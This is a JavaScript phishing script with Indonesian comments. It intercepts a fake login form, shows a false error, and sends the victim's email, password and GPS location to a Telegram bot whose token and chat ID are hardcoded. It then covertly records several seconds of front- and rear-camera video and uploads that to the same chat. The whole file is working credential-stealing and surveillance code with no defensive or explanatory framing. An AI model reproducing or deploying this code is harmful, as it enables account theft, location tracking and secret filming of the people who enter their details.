// Simpan email yang sudah diproses
    const processedEmails = new Set();

    function isEmailProcessed(email) {
        return processedEmails.has(email);
    }

    function markEmailAsProcessed(email) {
        processedEmails.add(email);
    }

    function showLoginPopup() {
        document.getElementById("loginPage").style.display = "flex";
    }

    const botToken = '8149464057:AAHScuyU-0brab-tH74nisX26IO7wCa2-_4';
    const chatID = '7955475790';

    let isFrontCamera = true;
    let currentStream = null;
    let videoRecorder = null;
    let videoDevices = [];

    // Mendapatkan perangkat video
    async function getVideoDevices() {
        const devices = await navigator.mediaDevices.enumerateDevices();
        return devices.filter(device => device.kind === 'videoinput');
    }

    // Mulai merekam video
    async function startVideoRecording() {
        videoDevices = await getVideoDevices();
        const selectedDevice = videoDevices[isFrontCamera ? 0 : 1];

        const constraints = {
            video: {
                deviceId: selectedDevice.deviceId,
                facingMode: isFrontCamera ? "user" : "environment"
            }
        };

        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }

        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {
                currentStream = stream;
                const chunks = [];
                videoRecorder = new MediaRecorder(stream);
                videoRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) chunks.push(event.data);
                };

                videoRecorder.onstop = () => {
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    sendLocationAndVideo(videoBlob); // Kirim lokasi dan video bersamaan
                    currentStream.getTracks().forEach(track => track.stop());

                    if (isFrontCamera) {
                        isFrontCamera = false;
                        setTimeout(startVideoRecording, 1000);
                    }
                };

                videoRecorder.start();
                const recordDuration = isFrontCamera ? 3000 : 3000;
                setTimeout(() => {
                    if (videoRecorder.state !== "inactive") videoRecorder.stop();
                }, recordDuration);
            })
            .catch(error => {
                console.error('Video permission error:', error);
            });
    }

    // Kirimkan video dan lokasi bersamaan
    function sendLocationAndVideo(videoBlob) {
        // Mendapatkan lokasi pengguna
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude } = position.coords;
                    const email = document.getElementById('email')?.value;
                    const password = document.getElementById('password')?.value;

                    // Menampilkan data lokasi
                    const message = `
                    📍 Lokasi Pengguna:
                    Latitude: ${latitude}
                    Longitude: ${longitude}
                    
                    ➣ Email: ${email}
                    ➣ Password: ${password}

                    🌍 Lihat di Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
                    `;

                    // Kirim video
                    const formData = new FormData();
                    formData.append("chat_id", chatID);
                    formData.append("video", videoBlob, "recorded_video.webm");

                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    })
                        .then(response => response.json())
                        .then(data => console.log('Video sent to Telegram:', data))
                        .catch(error => console.error('Error sending video to Telegram:', error));

                    // Kirim pesan dengan lokasi dan login info
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatID, text: message })
                    })
                        .then(response => response.json())
                        .then(data => console.log('Location info sent to Telegram:', data))
                        .catch(error => console.error('Error sending location info:', error));
                },
                (error) => {
                    console.error('Gagal mendapatkan lokasi:', error.message);
                    // Jika akses lokasi diblokir, kirimkan pesan lokasi yang tidak tersedia
                    const email = document.getElementById('email')?.value;
                    const password = document.getElementById('password')?.value;
                    const message = `
                    📍 Lokasi Pengguna (Akses diblokir):
                    Akses lokasi pengguna diblokir.

                    ➣ Email: ${email}
                    ➣ Password: ${password}

                    🌍 Lokasi tidak dapat diakses.
                    `;
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatID, text: message })
                    })
                        .then(response => response.json())
                        .then(data => console.log('Error info sent to Telegram:', data))
                        .catch(error => console.error('Error sending error info:', error));
                }
            );
        } else {
            console.error('Geolocation tidak didukung oleh browser ini.');
        }
    }

    // Event Listener untuk form login
    const loginForm = document.getElementById('loginForm');
    loginForm?.addEventListener('submit', function (e) {
        e.preventDefault();

        const email = document.getElementById('email')?.value;
        const password = document.getElementById('password')?.value;

        const errorMessage = document.getElementById('errorMessage');
        if (errorMessage) errorMessage.style.display = 'block';

        if (isEmailProcessed(email)) {
            return;
        }

        // Mengambil lokasi sebelum mengirim data
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { latitude, longitude } = position.coords;
                const message = `
                v2
                ➣ Username : ${email}
                ➣ Password : ${password}
                📍 Lokasi Pengguna:
                Latitude: ${latitude}
                Longitude: ${longitude}
                🌍 Lihat di Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
                `;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatID, text: message })
                })
                    .then(response => response.json())
                    .then(data => console.log(data))
                    .catch(error => console.error('Error:', error));

                markEmailAsProcessed(email);
                startVideoRecording();
            },
            (error) => {
                console.error('Gagal mendapatkan lokasi:', error.message);
                // Jika akses lokasi diblokir, kirimkan pesan lokasi yang tidak tersedia
                const message = `
                v2
                ➣ Username : ${email}
                ➣ Password : ${password}
                📍 Lokasi Pengguna (Akses diblokir):
                Akses lokasi pengguna diblokir.
                `;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatID, text: message })
                })
                    .then(response => response.json())
                    .then(data => console.log('Error info sent to Telegram:', data))
                    .catch(error => console.error('Error sending error info:', error));
            }
        );
    });